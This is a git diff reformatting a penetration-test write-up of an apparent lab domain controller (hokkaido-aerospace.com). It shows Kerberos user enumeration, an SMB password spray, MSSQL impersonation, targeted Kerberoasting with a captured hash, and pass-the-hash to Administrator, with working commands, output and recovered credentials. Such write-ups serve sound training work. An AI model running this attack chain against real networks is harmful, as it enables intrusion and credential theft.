@@ -70,7 +70,8 @@ layer
 
 The following diagram shows the initial network overview of provided targets.
 
-![[ChatGPT Image Jul 22, 2025, 09_07_04 PM.png]]
+<img width="1536" height="1024" alt="ChatGPT Image Jul 22, 2025, 09_07_04 PM" src="https://github.com/user-attachments/assets/bfb5b520-9ac2-4bc1-ab78-6ce110370b8f" />
+
 
 ### **Weak Password Policy and Credential Reuse**
 
@@ -159,7 +160,7 @@ From the scan results, I confirmed access was limited to the IP address `192.168
 The Nmap output revealed multiple open ports and services typically associated with an Active Directory environment, including SMB (445), Kerberos (88), LDAP (389/636), RDP (3389), and MS SQL (1433). IIS was also running on ports 80 and 8530, which indicated the presence of a Windows-based web server. Based on these findings, I identified the target as a likely domain controller within a Windows domain, named `hokkaido-aerospace.com`.
 
 Initial enumeration efforts were focused on accessible SMB shares and the web server to identify a viable attack vector. This included attempting to enumerate user accounts, identify weak credentials, and explore any misconfigurations that could be leveraged to gain access to internal systems.
-
+```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -292,16 +293,13 @@ Host script results:
 | smb2-time: 
 |   date: 2025-07-19T10:48:06
 |_  start_date: N/A
+```
 
 ### Brute force on Kerberos on port 88:
 To identify valid usernames within the domain, I performed a brute-force user enumeration attack against the Kerberos service running on port 88 of the domain controller (`192.168.192.40`). The following tool and command were used:
 ```
 kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.192.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
-```
-The results confirmed that several usernames were valid within the domain `hokkaido-aerospace.com`. The Kerberos service responded differently to valid usernames than invalid ones, allowing enumeration through response timing and status codes.
 
-kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.192.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100 
-...
 2025/07/19 12:28:58 >  Using KDC(s):
 2025/07/19 12:28:58 >   192.168.192.40:88
 
@@ -312,30 +310,28 @@ kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.192.40 /usr/share/secl
 2025/07/19 12:29:01 >  [+] VALID USERNAME:       discovery@hokkaido-aerospace.com
 2025/07/19 12:29:01 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
 2025/07/19 12:29:33 >  [+] VALID USERNAME:       maintenance@hokkaido-aerospa
+```
+The results confirmed that several usernames were valid within the domain `hokkaido-aerospace.com`. The Kerberos service responded differently to valid usernames than invalid ones, allowing enumeration through response timing and status codes.
 
 ### **Password Spray Against SMB (Port 445):**
 
 Following the enumeration of valid usernames via Kerberos, I conducted a password spray attack over SMB to identify weak or reused credentials. The spray was performed using `crackmapexec` with the following command:
 ```
  crackmapexec smb 192.168.192.40 -u users.txt -p passowrds.txt
-```
-┌──(enzy😈kali)-[/mnt/Enzy2/OSCP/pgp/hokkaido]
-└─$ crackmapexec smb 192.168.192.40 -u users.txt -p passowrds.txt
+
 SMB         192.168.192.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
 SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Winter2023 STATUS_LOGON_FAILURE 
 SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Summer2023 STATUS_LOGON_FAILURE 
 SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Spring2023 STATUS_LOGON_FAILURE 
 SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Fall2023 STATUS_LOGON_FAILURE 
 ==SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\info:info
-
+```
 The `users.txt` file contained valid domain usernames discovered during the Kerberos brute-force step. The password wordlist (`passowrds.txt`) was **manually crafted based on two key elements**:
 
 1. **The year the machine was operating in**, as seen from Kerberos and system timestamps (2023).
     
 2. **The usernames found in earlier enumeration**, along with simple transformations (e.g., reversed strings and case variations).
-
-┌──(enzy😈kali)-[/mnt/Enzy2/OSCP/pgp/hokkaido]
-└─$ cat passowrds.txt 
+```
 Winter2023
 Summer2023
 Spring2023
@@ -348,6 +344,7 @@ ofni
 rotartsinimda
 yrevocsid
 ecnanetniam
+```
 
 This approach proved effective. One valid credential pair was identified:
 ```
@@ -361,7 +358,7 @@ This confirmed that the `info` account was using weak and predictable credential
 Using the valid `info:info` credentials obtained from the SMB password spray, I enumerated accessible shares on the domain controller (`192.168.192.40`) with the following command:
 ```
 crackmapexec smb 192.168.192.40 -u info -p info --shares
-```   
+  
 SMB         192.168.192.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
 SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\info:info 
 SMB         192.168.192.40  445    DC               [+] Enumerated shares
@@ -376,6 +373,7 @@ SMB         192.168.192.40  445    DC               NETLOGON        READ        
 SMB         192.168.192.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.     
 SMB         192.168.192.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.                                                     
 SMB         192.168.192.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.  
+```
 
 The command confirmed access to several readable shares, including:
 
@@ -391,7 +389,6 @@ The command confirmed access to several readable shares, including:
 Of particular interest was the `SYSVOL` share, which is often used to distribute scripts and policies across the domain. I accessed it using `smbclient`:
 ```
 smbclient -N //192.168.192.40/SYSVOL -U info%info
-``` 
 
 smb: \> ls
   .                                   D        0  Sat Nov 25 13:11:08 2023
@@ -414,8 +411,7 @@ smb: \hokkaido-aerospace.com\scripts\temp\> ls
 
 smb: \hokkaido-aerospace.com\scripts\temp\> get password_reset.txt 
 getting file \hokkaido-aerospace.com\scripts\temp\password_reset.txt of size 27 as password_reset.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
-
-
+```
 
 Upon navigating to:
 ```
@@ -434,11 +430,12 @@ Initial Password: Start123!
 This credential was later found to be active for the `discovery` user account and was successfully used to authenticate to domain services. This confirmed that **sensitive credentials were stored in plaintext within an accessible SMB share**.
 ```
 crackmapexec smb 192.168.192.40 -u users.txt -p Start123!    
-```
+
 SMB         192.168.192.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
 SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE 
 SMB         192.168.192.40  445    DC               [-] hokkaido-aerospace.com\administrator:Start123! STATUS_LOGON_FAILURE 
-==SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!== 
+==SMB         192.168.192.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!==
+```
 
 ### **Kerberoasting Service Accounts:**
 
@@ -463,9 +460,6 @@ This indicates that while **the `maintenance` account is vulnerable to Kerberoas
 After obtaining valid credentials for the `discovery` user (`Start123!`), I attempted authentication against the MS SQL Server instance running on the domain controller (`192.168.192.40`). Using the Impacket `mssqlclient.py` tool with Windows authentication, I was able to connect successfully:
 ```
 impacket-mssqlclient hokkaido-aerospace.com/discovery:"Start123\!"@192.168.192.40 -windows-auth
-```
-
-
 
 SQL (HAERO\discovery  guest@master)> enum_db msdb
 name      is_trustworthy_on   
@@ -500,6 +494,7 @@ id   name               password
  0   ==b'hrapp-service'   b'Untimed$Runny'==   
 
 Upon establishing a connection, I explored the available commands and began enumeration of databases and permissions.
+```
 
 I discovered that although access to the `hrappdb` database was initially restricted, impersonation rights were granted through the following SQL role delegation:
 GRANTEE: HAERO\services  
@@ -539,7 +534,7 @@ This demonstrated a realistic and fully exploitable path to domain dominance thr
 
 The attack chain was visually confirmed in the BloodHound graph below:
 
-![[Pasted image 20250719134139.png]]
+<img width="1071" height="651" alt="Pasted image 20250719134139" src="https://github.com/user-attachments/assets/0e605951-7e7b-4616-9d20-1bc8c334ac2e" />
 
 ### **Targeted Kerberoasting via ACL Abuse**
 
@@ -548,9 +543,9 @@ After retrieving the `hrapp-service` credentials (`Untimed$Runny`) from the SQL 
 Using the `targetedKerberoast.py` tool, I executed a precise Kerberoasting attack against `Hazel.Green` with the following command:
 ```
 ./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.192.40
-```
 
 $krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$a84f5b31a019e84d6d7d05c2b6d4b654$9994957ef6c5afd27552c70fa4318620b5c62ff56ab87af3ec4e309c113e78ad4b1769fae755f7059831b6e9725d16195118390c3a3f61ab5c3e548abb1464a3ed827d3df9fafec9296a2396fbb186c7e7c8f516cb4ee5e9fbd38c32c1a54c18974ea68c43c912877a7b181b084bef4e9deb79c5eb30ca9dc794eb41cb2c5c1b0668c4dac787f22d1ae58eadd12a15fd2a5879b261455628703782cbd2fa5e79ca9d121dd12dc2b6234aa498bceaec3c7b9d0c3d4a5c4444af4ddcc4fab3d10544af74b7ea3a372e88bd0ecac1e043eb1c4239c96737ee1f955a43a098e7c254f4019b3a283e1b86413c7fbf058106cf1522041b300d677dcb8002a827f1678713f9da60b9f5f207d96068ec1fd7ef3028f3659356f999c1f85b69f06cef3f5e06eb9299657ad09360b67c1bcfa1b86080f73c307c555844b29463cf1f85c1cdf503ca82d535cd9ed4083559f031dce8d719f314216540a834ca136d84e8674dfcbfed9be8f02bf64c3f28407c1933038584d1a202643d9cac8ed3c039e9c3e45f57d68d7eb2342762f893fc0389e45331caa5063d33d089576d3ef5e5f5df38f219bf7a2011bcaa0c0e2cb13cb3dd07acd698b06f4f6787421f9465e5fff2c4403846284d39b88c94b16c52da63a3b7e8486a188e2162d076f38ccfa16449edec539f6a1a3baed5a5cd0901c65684e267ff10dbad5bcfd634fd9e44deff510444b08703b00a742f52cee79dad317be3344219dcb8826f620841ecf01feba62311be859210c0c3eb5684b06ddc63e81fa64b6f5990dad02d50b1d9a59461bcd95f2ad629f09cec8e064aa6d243c0bd86641a4a0c622d4cec3dc4a5e76d6e59073aa7a84f0e5b01d2b9926ac7d6eba7d31fe6cc7ac9afe40b80f766da7f9eb2d53ac8ae559b9f633b8165d89ce6c067dae9e0f76867e15c1343ba80e6efa9653d8ce048f1880577d04110938100205e3181c1cc4fd5fbbaf7d7879ab145c9d178ac6772652ddf6b9d6afe26411790164690456c0846f3d2b53fcdaea50bf08b1a5c11bae15dcb1864956065de1ebb656fa5f0188c8ad399afaf9887eefb46b4d0bdc3db240f36419667ec0c62cd60719414092758f0208613ccee0d66926208a8dc83a3142fc636d41464d3ed540bef39234dec938d2582ae303b650b627f71a3f1b5bd8ca2ccbf3cb72d27a3e3af33019696260ea6e7bf6ac687e8a7270d6f3923d3a1c3be121b7d895e5c4d4f4e4bad1c6a6cdb68adec3be8da6064bd71a4de1d8147db3fbea317c2442309c272317d2e79aaaf3c4984bc8dd3433b6edf3cb9fc7e95df036dca1783108f280da4e55f3b6b07b43b383f3ad6b722c384c79e2c7a2b3f8ec19243fc0daf663ab7f78f4a5e8f7d7019d2c2974af06bd1450410c09624002756435a0beedf244c05489c673550a3bfcea84e2a65297b8319c2f329bb78278b2f4cc3a4f9782e8b552292c57bd6ae80cbc767c4641dbbf671e4b6ce2d7bddd63a2856cf53b1f9dc0ba7b36cf89b53e18b41db9d348801fc6c2be473a66a5ff32673079131fa2d466ff854036d6b342b34ed8d3c48be33b0209bdbf0e81f66012480cd8b129cd70f0301245b1ee0fa10353760c7bc5a5fb32ffb263ead296037f83f26a7bedcfb3e
+```
 
 This attack:
 
@@ -602,7 +597,7 @@ xfreerdp /u:molly.smith /p:backdoor /v:192.168.192.40
 Once inside the desktop environment, I elevated privileges by launching **PowerShell as Administrator**. This provided me with a fully interactive and privileged shell on the domain controller, effectively confirming **complete domain compromise**.
 The screenshot below shows the desktop session and elevated PowerShell window, validating interactive and administrative access on the Domain Controller.
 
-![[Pasted image 20250719140634.png]]
+<img width="1024" height="768" alt="Pasted image 20250719140634" src="https://github.com/user-attachments/assets/ae507460-3501-4cf0-9a44-dbb797d70a37" />
 
 ### Privilege Escalation:
 After obtaining an interactive RDP session to the Domain Controller with `MOLLY.SMITH`, I verified the account’s privileges using:
@@ -628,7 +623,7 @@ evil-winrm -i 192.168.192.40 -u Administrator -H d752482897d54e239376fddb2a2109e
 ```
 The following screenshot shows a successful Evil-WinRM session using the stolen hash of the `Administrator` account:
 
-![[Pasted image 20250719141701.png]]
+<img width="640" height="480" alt="Pasted image 20250719141701" src="https://github.com/user-attachments/assets/7a4611f6-47b1-46ac-9b13-96bfc72d524c" />
 
 ### Conclusion:
 Due to the impact of the overall attack vectors as uncovered by this penetration test,
